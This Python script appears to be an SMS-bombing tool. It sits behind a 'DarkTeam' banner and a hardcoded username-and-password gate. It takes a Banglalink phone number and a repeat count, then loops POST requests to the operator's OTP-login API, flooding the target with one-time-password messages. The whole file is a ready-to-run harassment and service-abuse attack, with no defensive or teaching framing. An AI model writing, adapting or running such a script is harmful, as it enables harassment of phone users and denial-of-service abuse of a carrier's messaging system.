
import requests

import os

#style



print ("\033[0;34m")   

print("""




██████   █████  ██████  ██   ██       ████████ ███████  █████  ███    ███ 
██   ██ ██   ██ ██   ██ ██  ██           ██    ██      ██   ██ ████  ████ 
██   ██ ███████ ██████  █████   █████    ██    █████   ███████ ██ ████ ██ 
██   ██ ██   ██ ██   ██ ██  ██           ██    ██      ██   ██ ██  ██  ██ 
██████  ██   ██ ██   ██ ██   ██          ██    ███████ ██   ██ ██      ██ 
                                                                          
 """)




print ("\033[0;32m")   

print("""
    ╔═══════════════════════════════════════╗           """)       



#style

print ("\033[0;36m")

print("""
           Author    : ‣ Aϝrαɳ Ahɱҽԃ°
           Circle    :  Dαrκωεb2811
           tnx to    :  NiiL281 """)
   

#style

print ("\033[0;32m")        
print ("""    ╚═══════════════════════════════════════╝                 
""")



#print(yellow+"-----------------------------------------------------------")


print ("\033[0;31m")
print(" Enter Correct  Username & Password For Continue..")

print ("\033[0;33m")

n=2

while n==2:
  a=str(input("\n\t\t[>] Username:"))
  b=str(input("\n\t\t[>] Password:"))
  if a==" DarkTeam" and b=="Admin ":
   print("\n\t\t[ √ ] Accepted")
   n=3
  else:
   
   print("\n\n\t\t[ × ] Rejected. Please Try Again")
   n=2
   
   os.system('clear')


#Main Code

import requests 

apt="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"


os.system('clear')

print ("\033[0;31m")
number=str(input(" [>] Enter the BL number :"))

know={'mobile':number}

amount=int(input(" [>] Enter The Amount    :")) 

for i in range(amount):
    requests.post(apt,data=know)
    print(str(i+1)+"attempt success")